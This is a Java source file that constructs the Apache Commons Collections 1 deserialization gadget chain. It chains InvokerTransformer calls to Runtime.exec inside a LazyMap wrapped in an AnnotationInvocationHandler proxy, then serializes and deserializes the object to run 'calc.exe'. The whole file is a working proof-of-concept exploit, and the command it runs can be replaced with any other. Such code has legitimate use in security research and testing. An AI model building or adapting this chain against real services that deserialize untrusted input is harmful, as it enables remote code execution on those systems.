import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollection1All {
    public static void main(String... args) throws ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException {
        Object evilObject = getEvilObject();
        byte[] serializedObject = serializeToByteArray(evilObject);
        deserializeFromByteArray(serializedObject);
    }

    public static Object getEvilObject() throws ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException {

        String[] command = {"calc.exe"};

        final Transformer[] transformers = new Transformer[]{

                new ConstantTransformer(Runtime.class),

                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),

                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),

                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        command
                )
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map map = new HashMap<>();
        Map lazyMap = LazyMap.decorate(map, chainedTransformer);

        String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";
        final Constructor<?> constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
        Proxy evilProxy = (Proxy) Proxy.newProxyInstance(CommonsCollection1All.class.getClassLoader(), new Class[]{Map.class}, secondInvocationHandler);

        InvocationHandler invocationHandlerToSerialize = (InvocationHandler) constructor.newInstance(Override.class, evilProxy);
        return invocationHandlerToSerialize;

    }

    public static void deserializeAndDoNothing(byte[] byteArray) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(byteArray));
        ois.readObject();
    }

    public static byte[] serializeToByteArray(Object object) throws IOException {
        ByteArrayOutputStream serializedObjectOutputContainer = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(serializedObjectOutputContainer);
        objectOutputStream.writeObject(object);
        System.out.println(serializedObjectOutputContainer.toString());
        return serializedObjectOutputContainer.toByteArray();
    }

    public static Object deserializeFromByteArray(byte[] serializedObject) throws IOException, ClassNotFoundException {
        ByteArrayInputStream serializedObjectInputContainer = new ByteArrayInputStream(serializedObject);
        ObjectInputStream objectInputStream = new ObjectInputStream(serializedObjectInputContainer);
        InvocationHandler evilInvocationHandler = (InvocationHandler) objectInputStream.readObject();
        return evilInvocationHandler;
    }
}
